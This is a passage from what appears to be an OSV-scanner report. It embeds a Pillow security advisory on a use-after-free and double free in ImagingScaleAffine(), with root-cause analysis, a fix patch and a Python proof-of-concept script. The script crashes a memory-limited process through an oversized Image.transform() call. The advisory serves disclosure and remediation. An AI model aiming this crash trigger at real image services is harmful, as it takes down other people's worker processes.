time.\n\u003e \n\u003e Shortest demonstration on the stock build (the address-space limit stands in for `ulimit -v` / `uwsgi --limit-as` / `systemd LimitAS=` on a worker):\n\u003e \n\u003e ```python\n\u003e import resource, gc\n\u003e from PIL import Image\n\u003e resource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\n\u003e src = Image.new(\"L\", (8, 8))\n\u003e try:\n\u003e     src.transform((300_000_000, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\n\u003e except MemoryError:\n\u003e     pass                      # expected, and the process should carry on\n\u003e gc.collect()                  # instead: SIGSEGV in _dealloc -\u003e ImagingDelete -\u003e free()\n\u003e ```\n\u003e \n\u003e The 300 MB output image allocates; `calloc(300000000, 4)` (1.2 GB) does not. `MemoryError` is raised as intended, but the interpreter then dies with SIGSEGV, gdb showing `free()` ← `memory_return_block`/`ImagingDestroyArray` (`src/libImaging/Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`src/_imaging.c:188`). An AddressSanitizer build of the same sources (with `max_allocation_size_mb` used to make the `calloc` fail instead of an rlimit) reports `heap-use-after-free` in `ImagingDelete src/libImaging/Storage.c:257` called from `_dealloc src/_imaging.c:188`, on a 128-byte region \"freed by\" `ImagingDelete` ← `ImagingScaleAffine src/libImaging/Geometry.c:866` ← `ImagingTransformAffine Geometry.c:1043` ← `ImagingTransform Geometry.c:1135` ← `_transform src/_imaging.c:2153`, \"previously allocated by\" `ImagingNewPrologueSubtype Storage.c:53` ← … ← `_new src/_imaging.c:756`.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e `Image.transform()` creates the output image as an ordinary Python-owned image and then transforms *into* it:\n\u003e \n\u003e ```python\n\u003e # src/PIL/Image.py:3008…3021\n\u003e         im = new(self.mode, size, fillcolor)\n\u003e         …\n\u003e             im.__transformer(\n\u003e                 (0, 0, *size), self, method, data, resample, fillcolor is None\n\u003e             )\n\u003e ```\n\u003e \n\u003e `__transformer()` rewrites `Transform.EXTENT` into an axis-aligned affine matrix (`src/PIL/Image.py:3040-3046`: `data = (xs, 0, x0, 0, ys, y0)`, `method = Transform.AFFINE`) and calls `self.im.transform(box, image.im, method, data, resample, fill)` (`Image.py:3117`). `resample` defaults to `Resampling.NEAREST` (`Image.py:2936`).\n\u003e \n\u003e In C, `_transform()` passes its *own* image as the destination:\n\u003e \n\u003e ```c\n\u003e /* src/_imaging.c:2153 */\n\u003e     imOut = ImagingTransform(\n\u003e         self-\u003eimage, imagep-\u003eimage, method, x0, y0, x1, y1, a, filter, fill\n\u003e     );\n\u003e ```\n\u003e \n\u003e `ImagingTransformAffine()` takes the scaling fast path because the filter is NEAREST and the matrix has no shear:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/Geometry.c:1035-1043 */\n\u003e     if (filterid || imIn-\u003etype == IMAGING_TYPE_I16) {\n\u003e         return ImagingGenericTransform(…);\n\u003e     }\n\u003e     if (a[1] == 0 \u0026\u0026 a[3] == 0) {\n\u003e         /* Scaling */\n\u003e         return ImagingScaleAffine(imOut, imIn, x0, y0, x1, y1, a, fill);\n\u003e     }\n\u003e ```\n\u003e \n\u003e and `ImagingScaleAffine()` allocates a table of `imOut-\u003exsize` ints:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/Geometry.c:863-868 */\n\u003e     /* malloc check ok, uses calloc for overflow */\n\u003e     xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n\u003e     if (!xintab) {\n\u003e         ImagingDelete(imOut);                         /* \u003c-- imOut belongs to the caller */\n\u003e         return (Imaging)ImagingError_MemoryError();\n\u003e     }\n\u003e ```\n\u003e \n\u003e `ImagingDelete()` (`src/libImaging/Storage.c:250-279`) drops the refcount to 0, returns the pixel blocks to the arena / `free()`s them via `im-\u003edestroy`, and `free(im)`. `self-\u003eimage` in the `ImagingCore` object still points at the freed struct. `_transform()` returns `NULL`, `Image.transform()` propagates `MemoryError`, the half-built output `Image` loses its last reference, and `_dealloc()` (`src/_imaging.c:188`) calls `ImagingDelete(imagep-\u003eimage)` again: it locks `im-\u003emutex` and decrements `im-\u003erefcount` inside freed memory, then walks `im-\u003eblocks` (already freed, typically reused by then) and frees every entry a second time. In the observed stock-build runs the freed `blocks` array had been overwritten, so `free()` receives a mangled pointer and the process segfaults; with other heap states it is a plain double free of a 300 MB block.\n\u003e \n\u003e Every other error return in `Geometry.c` (`ImagingError_ModeError`, `ImagingError_Mismatch`, `\"bad filter number\"`, `\"bad transform method\"`) leaves `imOut` alone; line 866 is the only one that deletes it. The delete is only correct for the other caller, `_resize()` (`src/_imaging.c:2026-2030`), where `imOut` is a fresh `ImagingNewDirty()` temporary that nothing else references. The delete predates Pillow's git history: it came in with the PIL 1.1.7 import, `9a640e315715` (\"Forking PIL\", 2010-07-30), so every release since Pillow 1.0 is affected.\n\u003e \n\u003e The output width is what decides whether the path is hit: the output image costs `width × height × pixelsize` bytes, the table an additional `4 × width`. A very wide, 1-row output (300 000 000 × 1 \"L\": 300 MB image, 1.2 GB table) makes the table the allocation that fails. `ImagingNewPrologueSubtype()` caps `xsize` at `INT_MAX/4 - 1`, so the table is at most ~2 GB.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Applications that let a user choose the output size of `Image.transform()` — `Transform.EXTENT` (crop-and-scale), `Transform.AFFINE` with a pure scale/translate matrix, or the `ImageTransform.ExtentTransform`/`AffineTransform` helpers, all with the default NEAREST resampling — can have an allocation failure turned into a use-after-free and double free inside the worker process instead of the `MemoryError` the API is meant to raise. `resize()`, `thumbnail()` and `rotate()` do not reach this path; `Image.resize(..., NEAREST, box=...)` goes through `ImagingScaleAffine()` but owns its output, and raises a clean `MemoryError`. The second precondition is that the output image itself allocates but the extra `4 × width` bytes do not; on 64-bit Linux with default overcommit this requires an address-space limit on the process (`ulimit -v`, `uwsgi --limit-as`, `systemd LimitAS=`, an in-app `setrlimit`), which is a common hardening for image workers; 32-bit processes can reach it through ordinary address-space exhaustion. The demonstrated consequence is a crash of the process handling the request after `MemoryError` has already been raised and possibly handled. The second `ImagingDelete()` also writes into the freed 128-byte struct (mutex, refcount) and double-frees an attacker-sized block, which is heap corruption rather than a clean abort, but no control over the written data is shown.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e Run `repro` (a self-contained Python script) from any directory. It uses the installed stock build, so nothing is rebuilt, and has no companion files. It runs the demonstration above in a child interpreter (`python3 -c`, taking `WIDTH` as an argument): the child disables core files, sets `RLIMIT_AS` to 1 GB (the kind of limit image workers are commonly given), creates an 8×8 \"L\" image, calls `src.transform((WIDTH, 1), Image.Transform.EXTENT, (0, 0, 8, 8))` with the default NEAREST resampling, prints `MemoryError caught` if that raises, then runs `gc.collect()` and prints `alive`. EXTENT with NEAREST is a pure scale, so the call goes through `ImagingScaleAffine()`, which callocs a `4 × WIDTH`-byte table in addition to the `WIDTH`-byte output image.\n\u003e \n\u003e The script runs the child twice:\n\u003e \n\u003e - **Control:** width 50 000 000. The 50 MB image and the 200 MB table both fit under the limit, and the transform succeeds, which shows the limit itself is harmless.\n\u003e - **Attack:** width 300 000 000. The 300 MB output image is allocated, but `calloc(300000000, 4)` (1.2 GB) fails. Pillow correctly raises `MemoryError`, and the child catches it. But `ImagingScaleAffine()` has already called `ImagingDelete()` on the output image it does not own. When the output image is released, it is freed again. The child prints `MemoryError caught` and then dies with SIGSEGV instead of printing `alive`.\n\u003e \n\u003e If the attack child was killed by a signal and `gdb` is installed, the script runs the attack again under `gdb` and prints the backtrace. The crash is in `free()` ← `memory_return_block`/`ImagingDestroyArray` (`Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`_imaging.c:188`). In other words, the Python object's destructor is deleting the already-freed struct a second time. The verdict does not depend on this step.\n\u003e \n\u003e The last line is `BUG` when the control exits 0 and the attack prints `MemoryError caught` and then dies from a signal without printing `alive`. Otherwise it is `OK`. With the attached patch applied, the attack prints `MemoryError caught`, then `alive`, exits 0, and the script prints `OK`.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e `ImagingScaleAffine()` never owns `imOut`. The attached patch removes the `ImagingDelete()` at `src/libImaging/Geometry.c:866` and makes the one caller that relied on it, `_resize()` in `src/_imaging.c`, clean up its own temporary, the same idiom `_gaussian_blur()`/`_unsharp_mask()` already use. This also fixes `_resize()` passing a possible `NULL` from `ImagingNewDirty()` into `ImagingTransform()`, and leaking the temporary on the other `ImagingTransform()` error returns:\n\u003e \n\u003e ```diff\n\u003e --- a/src/libImaging/Geometry.c\n\u003e +++ b/src/libImaging/Geometry.c\n\u003e @@ -863,7 +863,7 @@ ImagingScaleAffine(\n\u003e      /* malloc check ok, uses calloc for overflow */\n\u003e      xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n\u003e      if (!xintab) {\n\u003e -        ImagingDelete(imOut);\n\u003e +        /* imOut is owned by the caller; don't delete it here */\n\u003e          return (Imaging)ImagingError_MemoryError();\n\u003e      }\n\u003e --- a/src/_imaging.c\n\u003e +++ b/src/_imaging.c\n\u003e @@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n\u003e          a[5] = box[1];\n\u003e  \n\u003e          imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n\u003e +        if (!imOut) {\n\u003e +            return NULL;\n\u003e +        }\n\u003e  \n\u003e -        imOut = ImagingTransform(\n\u003e -            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e -        );\n\u003e +        if (!ImagingTransform(\n\u003e +                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e +            )) {\n\u003e +            ImagingDelete(imOut);\n\u003e +            return NULL;\n\u003e +        }\n\u003e      } else {\n\u003e ```\n\u003e \n\u003e Every `ImagingTransform*()` path returns the same `imOut` on success, so wrapping the original pointer in `PyImagingNew()` in `_resize()` is unchanged behaviour. With the patch applied to a clean checkout and rebuilt, the reproducer prints `OK` and `Image.resize(..., NEAREST, box=...)` under the same limit raises a clean `MemoryError`.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Stop ImagingScaleAffine() deleting the caller-owned output image on calloc failure; make _resize() free its own temporary instead\n\u003e \n\u003e Applies to `src/libImaging/Geometry.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/src/_imaging.c b/src/_imaging.c\n\u003e index 7e9c0e391..ac1873292 100644\n\u003e --- a/src/_imaging.c\n\u003e +++ b/src/_imaging.c\n\u003e @@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n\u003e          a[5] = box[1];\n\u003e  \n\u003e          imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n\u003e +        if (!imOut) {\n\u003e +            return NULL;\n\u003e +        }\n\u003e  \n\u003e -        imOut = ImagingTransform(\n\u003e -            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e -        );\n\u003e +        if (!ImagingTransform(\n\u003e +                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e +            )) {\n\u003e +            ImagingDelete(imOut);\n\u003e +            return NULL;\n\u003e +        }\n\u003e      } else {\n\u003e          imOut = ImagingResample(imIn, xsize, ysize, filter, box);\n\u003e      }\n\u003e diff --git a/src/libImaging/Geometry.c b/src/libImaging/Geometry.c\n\u003e index 1bf92e26e..2baf000a5 100644\n\u003e --- a/src/libImaging/Geometry.c\n\u003e +++ b/src/libImaging/Geometry.c\n\u003e @@ -863,7 +863,7 @@ ImagingScaleAffine(\n\u003e      /* malloc check ok, uses calloc for overflow */\n\u003e      xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n\u003e      if (!xintab) {\n\u003e -        ImagingDelete(imOut);\n\u003e +        /* imOut is owned by the caller; don't delete it here */\n\u003e          return (Imaging)ImagingError_MemoryError();\n\u003e      }\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,064 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # UAF/double free in ImagingScaleAffine() (src/libImaging/Geometry.c:866):\n\u003e # on calloc() failure it ImagingDelete()s imOut, which for Image.transform()\n\u003e # is the Imaging struct owned by the live Python output image; that image's\n\u003e # _dealloc then ImagingDelete()s it again. Stock /src build, no rebuild.\n\u003e # A 1 GB RLIMIT_AS makes the 300 MB output image fit but the 1.2 GB\n\u003e # 4*width lookup table fail. Expected: MemoryError, process survives.\n\u003e import subprocess, sys, textwrap, signal\n\u003e \n\u003e child = textwrap.dedent('''\n\u003e     import resource, gc, sys\n\u003e     from PIL import Image\n\u003e     resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n\u003e     resource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\n\u003e     w = int(sys.argv[1])\n\u003e     src = Image.new(\"L\", (8, 8))\n\u003e     try:\n\u003e         src.transform((w, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\n\u003e         print(\"transform ok\")\n\u003e     except MemoryError:\n\u003e         print(\"MemoryError caught\")\n\u003e     gc.collect()\n\u003e     print(\"alive\")\n\u003e ''')\n\u003e \n\u003e def run(width):\n\u003e     p = subprocess.run([sys.executable, \"-u\", \"-c\", child, str(width)],\n\u003e                        capture_output=True, text=True, timeout=50)\n\u003e     print(f\"-- width={width}: rc={p.returncode}\\n{p.stdout.rstrip()}\")\n\u003e     return p\n\u003e \n\u003e ctrl = run(50_000_000)      # 50 MB image + 200 MB table fit under the limit\n\u003e att = run(300_000_000)      # 300 MB image fits, 1.2 GB table does not\n\u003e bug = (ctrl.returncode == 0 and \"MemoryError caught\" in att.stdout\n\u003e        and \"alive\" not in att.stdout and att.returncode \u003c 0)\n\u003e if att.returncode \u003c 0:\n\u003e     print(\"attack child killed by\", signal.Signals(-att.returncode).name)\n\u003e     import shutil\n\u003e     if shutil.which(\"gdb\"):   # evidence only; verdict does not depend on it\n\u003e         g = subprocess.run([\"gdb\", \"-q\", \"-batch\", \"-ex\", \"run\", \"-ex\", \"bt 6\", \"--args\",\n\u003e                             sys.executable, \"-c\", child, \"300000000\"],\n\u003e                            capture_output=True, text=True, timeout=120)\n\u003e         print(\"\\n\".join(l for l in g.stdout.splitlines()\n\u003e                         if l.startswith(\"#\") or \"signal\" in l))\n\u003e print(\"BUG\" if bug else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-7mwm-ghpf-9vrm | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112402\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-112402",
              "name": "CVE-2026-112402",
              "properties": {
                "security-severity": "8.7"
